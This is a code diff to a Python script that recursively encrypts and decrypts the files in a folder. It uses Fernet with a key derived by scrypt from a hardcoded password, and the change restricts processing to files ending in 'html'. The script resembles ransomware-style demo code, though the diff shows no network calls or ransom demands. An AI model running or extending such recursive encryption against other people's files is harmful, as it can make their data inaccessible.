@@ -15,6 +15,8 @@ import sys
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 
+extensao_de_arquivo_a_criptografar = "html"
+
 hardcoded_password = "BeYr_OwnSt4R!"
 
 # We are using the secrets module instead of random because secrets is used for generating cryptographically strong
@@ -136,17 +138,19 @@ def decrypt(filename, key):
 # encrypt() function if it is a file. If it's a folder, we recursively run the encrypt_folder() but pass the child path
 # into the foldername argument.
 def encrypt_folder(foldername, key):
-    # se for pasta de arquivos, criptografa a pasta inteira
+
+
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file():
+        if child.is_file() and str(child).lower().endswith(extensao_de_arquivo_a_criptografar):
             print(f"[*] Encrypting {child}")
             encrypt(child, key)
         elif child.is_dir():
             encrypt_folder(child, key)
 
 def decrypt_folder(foldername, key):
+
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file():
+        if child.is_file() and str(child).lower().endswith(extensao_de_arquivo_a_criptografar):
             print(f"[+] Decrypting {child}")
             decrypt(child, key)
         elif child.is_dir():
@@ -162,6 +166,7 @@ def decrypt_folder(foldername, key):
 
 def main(dir, type):
     _key = generate_key(hardcoded_password, load_existing_salt=True)
+
     if type=="E":
         if os.path.isfile(dir):
             encrypt(dir, _key)
